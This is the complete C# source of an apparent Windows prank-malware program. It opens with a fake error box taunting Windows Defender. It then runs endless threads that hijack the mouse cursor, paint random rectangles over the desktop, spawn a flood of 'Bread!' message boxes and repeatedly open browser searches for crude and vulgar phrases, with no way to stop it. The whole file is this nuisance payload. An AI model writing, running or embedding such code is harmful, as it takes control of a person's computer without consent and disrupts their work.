using System;
using System.Windows.Forms;
using System.Threading;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Web;
using System.Linq;

namespace forms
{
    static class Program
    {
        [DllImport("user32.dll")]
        static extern IntPtr FindWindow(IntPtr classname, string title); // extern method: FindWindow
        [DllImport("user32.dll")]
        static extern void MoveWindow(IntPtr hwnd, int X, int Y, int nWidth, int nHeight, bool rePaint); // extern method: MoveWindow
        [DllImport("user32.dll")]
        static extern bool GetWindowRect(IntPtr hwnd, out Rectangle rect); // extern method: GetWindowRect

        static void Main()
        {
            MessageBox.Show("Get fucked Windows Defender L", "Runtime Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            new Thread(() => fun.Search_random()).Start();
            new Thread(() => Cursor_moves()).Start();
            new Thread(() => rectangling()).Start();
            new Thread(() => boxing()).Start();
        }


        static void Cursor_moves()
        {
            while (true)
            {
                Random rnd = new Random();
                Point cPoint = new Point(Cursor.Position.X - rnd.Next(100), Cursor.Position.Y - rnd.Next(100));
                fun.MoveCursor(cPoint);
                Thread.Sleep(50);
                Random rnd2 = new Random();
                cPoint = new Point(Cursor.Position.X + rnd2.Next(100), Cursor.Position.Y + rnd2.Next(100));
                fun.MoveCursor(cPoint);
                Thread.Sleep(50);
            }
        }

        static void rectangling()
        {
            var width = Screen.PrimaryScreen.Bounds.Width;
            var height = Screen.PrimaryScreen.Bounds.Height;

            while (true)
            {
                Random rnd = new Random();
                SolidBrush color = drawing.randomBrush();
                drawing.rectangle(rnd.Next(-1000, width), rnd.Next(-1000, height), rnd.Next(width), rnd.Next(height), color);
                Thread.Sleep(10);
            }
        }

        static void boxing()
        {
            var width = Screen.PrimaryScreen.Bounds.Width;
            var height = Screen.PrimaryScreen.Bounds.Height;
            var screens = Screen.AllScreens.Length;

            while (true)
            {

                box(tools.RandomString(10), width, height, screens);
                Thread.Sleep(500);
            }

        }

        static void box(string name, int mvMaxX, int mvMaxY, int screenCount)
        {
            Process nProcessID = Process.GetCurrentProcess();
            Random rnd = new Random();

            Thread myThread = new Thread(() => MessageBox.Show("Bread!", name, MessageBoxButtons.OK, MessageBoxIcon.Information));
            FindAndMoveMsgBox(rnd.Next(mvMaxX * screenCount), rnd.Next(mvMaxY), name);
            myThread.Start();
        }

        static void FindAndMoveMsgBox(int x, int y, string title)
        {
            Thread thr = new Thread(() => // create a new thread
            {
                IntPtr msgBox = IntPtr.Zero;
                // while there's no MessageBox, FindWindow returns IntPtr.Zero
                while ((msgBox = FindWindow(IntPtr.Zero, title)) == IntPtr.Zero) ;
                // after the while loop, msgBox is the handle of the MessageBox
                Rectangle r = new Rectangle();
                GetWindowRect(msgBox, out r);
                MoveWindow(msgBox, x, y, r.Width - r.X, r.Height - r.Y, false);
            });
            thr.Start();
        }
    }

    static class drawing
    {
        [DllImport("User32.dll")]
        public static extern IntPtr GetDC(IntPtr hwnd);
        [DllImport("User32.dll")]
        public static extern void ReleaseDC(IntPtr hwnd, IntPtr dc);
        public static void rectangle(int x, int y, int width, int height, SolidBrush color)
        {
            IntPtr desktopPtr = GetDC(IntPtr.Zero);
            Graphics g = Graphics.FromHdc(desktopPtr);
            g.FillRectangle(color, new Rectangle(x, y, width, height));
            g.Dispose();
            ReleaseDC(IntPtr.Zero, desktopPtr);
        }

        public static SolidBrush randomBrush()
        {
            Random rand = new Random();
            SolidBrush brush = new SolidBrush(Color.FromArgb((byte)rand.Next(0, 256), (byte)rand.Next(0, 256), (byte)rand.Next(0, 256)));
            return brush;
        }
    }

    static class fun
    {
        public static void MoveCursor(Point point)
        {
            Cursor cursor = new Cursor(Cursor.Current.Handle);
            Cursor.Clip = new Rectangle(point, cursor.Size);
        }

        public static void Search_random()
        {
            string[] search = {
            "cock moment", "whar is goin on", "19 minute crafts", "all my homies hate fridgis", "how to remoV virus 2016 working free",
            "minecraf", "google.com", "how to breathe", "no bitches?", "ř", "how to get girlfriend", "😰", "bonk", "how to download fornite",
            "why all the girls no more talk to me when I tell them I play league of legends", "why do I want to commit arson after playing Valorant",
            $"{tools.RandomString(69)}", "is sex real?", "whats my ip (get doxxed XD)"
            };

            while (true)
            {
                Random rand = new Random();
                int index = rand.Next(search.Length);
                string urlEncoded = HttpUtility.UrlEncode(search[index]);
                string searchStr = $"https://google.com/search?q={urlEncoded}";
                Process.Start(searchStr);
                Thread.Sleep(10_000);
            }
        }
    }

    static class tools
    {
        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
    }
}